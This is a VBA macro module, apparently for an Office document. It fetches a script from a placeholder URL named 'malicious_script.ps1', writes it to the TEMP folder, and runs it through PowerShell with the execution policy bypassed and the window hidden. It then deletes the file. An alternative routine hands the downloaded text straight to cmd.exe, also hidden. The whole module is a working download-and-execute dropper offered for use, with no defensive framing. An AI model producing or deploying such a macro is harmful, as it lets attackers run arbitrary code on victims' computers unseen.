Sub ExecuteScriptFromURL()
    Dim URL As String
    URL = "http://example.com/malicious_script.ps1" ' Replace with the desired URL
    
    Dim ScriptContent As String
    ScriptContent = GetTextFromURL(URL)
    
    ' Execute the script in PowerShell
    ExecutePowerShellScript ScriptContent
    
    ' Alternatively, execute the script in CMD
    ' ExecuteCMDScript ScriptContent
End Sub

Function GetTextFromURL(URL As String) As String
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    
    objHTTP.Open "GET", URL, False
    objHTTP.send
    
    If objHTTP.Status = 200 Then
        GetTextFromURL = objHTTP.responseText
    Else
        GetTextFromURL = ""
    End If
    
    Set objHTTP = Nothing
End Function

Sub ExecutePowerShellScript(ScriptContent As String)
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    Dim tempFilePath As String
    tempFilePath = Environ("TEMP") & "\temp.ps1"
    
    ' Write the script content to a temporary file
    Dim fileObject As Object
    Set fileObject = CreateObject("Scripting.FileSystemObject")
    
    Dim fileStream As Object
    Set fileStream = fileObject.CreateTextFile(tempFilePath, True)
    
    fileStream.Write ScriptContent
    fileStream.Close
    
    ' Execute the temporary PowerShell script
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -File " & Chr(34) & tempFilePath & Chr(34), 0
    
    ' Delete the temporary file
    fileObject.DeleteFile tempFilePath
    
    Set objShell = Nothing
    Set fileStream = Nothing
    Set fileObject = Nothing
End Sub

Sub ExecuteCMDScript(ScriptContent As String)
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    objShell.Run "cmd.exe /c " & ScriptContent, 0
    
    Set objShell = Nothing
End Sub